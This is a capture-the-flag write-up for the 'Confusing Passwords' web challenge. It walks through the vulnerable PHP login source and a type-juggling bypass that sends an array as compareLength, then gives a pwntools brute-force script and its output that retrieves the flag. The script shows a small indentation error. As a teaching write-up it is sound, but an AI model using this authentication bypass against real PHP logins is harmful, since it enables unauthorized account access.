---
title: "Confusing Passwords"
description: "This login system will give you the flag... as long as you can prove you're an admin!"
author: "0x0539"
date: "2023-06-16"
published: true
tags: ["capture the flag", "0x0539", "web"]
---

# confusing passwords

[challenge](https://0x0539.net/play/minas_tirith/confusing_passwords)

<aside>
👻  Admin Login
Prove [you're] an admin to access the flag.
</aside>

## overview

The challenge landing page presents us with the login form and the page's source code. It's PHP-based, and the source code here contains hardcoded credentials (in the form of our target username, `admin`):

```php
<?php
  // First check if the player wants to view the source, if so we'll display then kill the page.
  if(isset($_POST["viewsrc"]))
  {
    echo "<pre>";
    echo htmlentities(file_get_contents(basename(__FILE__)));
    echo "</pre>";
    die();
  }

  function checkCredentials($user, $password, $correctUser, $correctPassword, $checkCompareLen)
  {
    if($user != $correctUser)
      return false;

    // Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that
    // it's fully compared.
    if($checkCompareLen < strlen($correctPassword))
      return false;

    // We should also check against an integer overflow
    if($checkCompareLen < 0)
      return false;

    // Finally, compare the passwords
    return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
  }

  $loginAttempted = false;
  $loginSuccess   = false;

  $correctUsername  = "admin";
  $correctPassword  = file_get_contents("/adminpwd.txt", FILE_USE_INCLUDE_PATH);

  // :D
  $flag = file_get_contents("/flag.txt", FILE_USE_INCLUDE_PATH);

  // Check that all fields are set before attempting to login
  if(!empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["compareLength"]))
  {
    $checkUsername    = $_POST["username"];
    $checkPassword    = $_POST["password"];
    $checkCompareLen  = $_POST["compareLength"];

    $loginAttempted = true;
    $loginSuccess   = checkCredentials($checkUsername, $checkPassword, $correctUsername, $correctPassword, $checkCompareLen);
  }
?>

<!-- [ and then the page's html & css. ] -->
```

## initial enumeration

Upon initial inspection, it seems the `checkCredentials` function ensures the following:
- all necessary parameters must be included in a POST request,
- the `username` and `compareLength` parameters must contain a value.

We can run some requests through burpsuite to make some modifications to the request's POST data - we see that the default value for `compareLength` is `32`.

![burp_post_test](/img/confusing_passwords_img/burp_post_test.png)

Given this, the final line of the login form's code:
```php
// ...
return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
```
...seems especially interesting.

It appears that the program compares each character in our POSTed password - stored in the variable`$password` - against `$correctPassword`, but it uses `compareLength` (which we can modify) to determine how many characters it should compare.
If correct, we can set `checkCompareLen` to `0` via our POST request, which would set `intval($checkCompareLen)` to `0`. This would mean the form would compare 0 characters from the POSTed password to the actual password, possibly allowing us to bypass the password requirement altogether.

However, this won't work because the script ensures the value of `compareLength` will cover the minimum number of characters in `$correctPassword`:

```php
// ...
// Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that
// it's fully compared.
if($checkCompareLen < strlen($correctPassword))
      return false;
```

So this idea won't work.

## vulnerabilities

So to recap, we should be able to make the following assumptions :

- The value of `username` from the POST request must be the same as that of `$correctUser`,
- The value of the `compareLength` parameter must be:
    1. Greater than `0`,
    2. Greater than (or equal to) the number of characters in `$correctPassword`.

### `username` parameter?

We already know from source code that the correct username is `admin`, and `username` ultimately isn't really involved in further authentication functionality, so this can be ignored for now.

### `password` parameter?

Instead, we may be able to modify our POST request to pass an unexpected value to the `password` or `compareLength` checks, which may invoke some unexpected behaviour.

We can do this via a class of vulnerability called `type juggling`, which (in this case) is a result of PHPs interpreter converting different types (integers, strings, arrays, and so on) to a "common value"
when it needs to perform operations on them. In PHP, these vulnerabilities are commonly the result of 'loose' comparison operators (e.g., `==`, `!=`), which will compare only the _value_ stored in an object when invoked.

Conversely, 'strict' operators (`===`, `!==`, and so on) will compare both the stored value alongside the object's _type_.

A common PHP vulnerability involves a login form script that uses the `strcmp()` function paired with a loose comparison operator, which can be exploited by changing the type of one of these variables:
```php
// a hypothetical webpage might try to validate a password with a `strcmp()` function like so:
return (strcmp($password, $correctPassword) == 0)

// `strcmp()` wants to operate on two strings, and will compare each string character-by-character:
return (strcmp("password123", "password123") == 0) // returns `true` as there are 0 different characters.

// in the above example, if we were to make a post request with the following parameters:
username=admin&password[]=

// it would be evaulated as:
return (strcmp(Array(),"real_password123") == 0) // this returns `true`: `Array()` == `NULL` == `0`.
// an unexpected array object is determined by `strcmp()` to contain `NULL`;
// PHP considers `NULL` to be 'loosely' equal to `0`, and so the login form will return `true` for this operation.
```

However, we are not dealing with the exact functionality due to a strict comparison operation, but serves as a simple example.

### `compareLength` parameter

Regarding `compareLength`; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is greater than `0`,
passes all 'pre-strncmp()' statements, and also results in a low number when the page uses it to index the number of characters to check.

### exploit

The login function uses `intval()` to convert the data in `compareLength` to an integer; a practice that the [PHP documentaion **strongly** advises against when dealing with objects](https://www.php.net/manual/en/function.intval.php):

>Returns the int value of value, using the specified base for the conversion (the default is base 10). **intval() should not be used on objects, as doing so will emit an E_WARNING level error and return 1.**

Another notable quirk about PHP & arrays (as it related to the page's functionality): Array objects are always considered greater than any non-array object (regardless of their actual values) - so a request with an empty array will pass both the tests we require.

So, by assigning an Array to the `compareLength` parameter:

- it will be a larger number than the length of `correctPassword` via type conversion principles,
- `intval()` will still evaluate it as `1`.

This ultimately means `strncmp()` will only be asked to compare the first character in `$correctPassword` and our `password` parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a *maximum* of ~52 requests (the first character is likely [`a-Z`]).

We can check that our interpretation of the request is correct by submitting a post request with the `password` and `compareLength` params as arrays:

![burp_post_test](/img/confusing_passwords_img/burp_post_test_4.png)

The page throws a `strncmp` warning, so we know that it tried to parse the arrays as strings.

With this type juggling exploit confirmed, we can throw together a quick python script with `pwntools`:

- we make a post request with a malformed `compareLength` parameter,
- the response is checked against a success condition; failed attempts are ignored,
- upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain


```php
// ...
Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>`
```
>This could just as easily be replace with the opposite operation; something like `if not b'Login failed' in response`).

In any case, this was the final exploit script:

```python
from pwn import *

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=+_<>'
charset = [*charset]
for char in charset:
    print(f'trying {char}...')
    r = remote('challenges.0x0539.net',3011)
    r.send('POST /index.php HTTP/1.1\r\n'
            'Content-Length: 42\r\n'
            'Host: challenges.0x0539.net:3011\r\n'
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\n'
            'Referer: http://challenges.0x0539.net:3011/index.php\r\n'
            'Content-Type: application/x-www-form-urlencoded\r\n'
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
            'Connection: close\r\n\r\n'
            'username=admin&password={}&compareLength[]='.format(char))

    response = r.recvall()
    if b'the secret flag:' in response:
    print(f'\n####### \n\'secret flag\' found in response. trimmed output:')
        print(((response.rsplit(b' Welcome admin.',2)[1]).rsplit(b'</div>\n')[0]).strip())
        print('#######')
        break
```

Running the script, we are able to successfully login with a POST request using `&password=f`:

```lua
┌──(root㉿RUBY)-[/mnt/…/ctf/sites/0x0539/confusing-passwords]
└─# python pass_enum.py
trying a...
/mnt/a/ctf/sites/0x0539/confusing-passwords/pass_enum.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send('POST /index.php HTTP/1.1\r\n'
trying b...
trying c...
trying d...
trying e...
trying f...
#######
'secret flag' found in response. appending trimmed output:

b"Since you've authenticated as an admin, here's the secret flag: FLAG{[redacted]}"
#######
```
